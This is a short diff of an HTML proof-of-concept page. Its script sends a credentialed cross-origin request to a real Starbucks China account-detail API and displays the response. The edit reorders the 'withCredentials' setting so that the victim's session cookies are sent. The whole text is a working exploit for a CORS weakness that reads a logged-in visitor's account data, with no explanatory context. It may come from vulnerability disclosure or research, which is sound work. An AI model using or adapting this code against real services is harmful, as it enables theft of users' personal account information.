@@ -10,8 +10,9 @@
 			alert(xmlhttp.responseText);
 		}
 	}
-    	xmlhttp.withCredentials = true;
+    	
 	xmlhttp.open("GET","https://profile.starbucks.com.cn/api/account/detail",true);
+	xmlhttp.withCredentials = true;
 	xmlhttp.send();
 </script>
 </html>
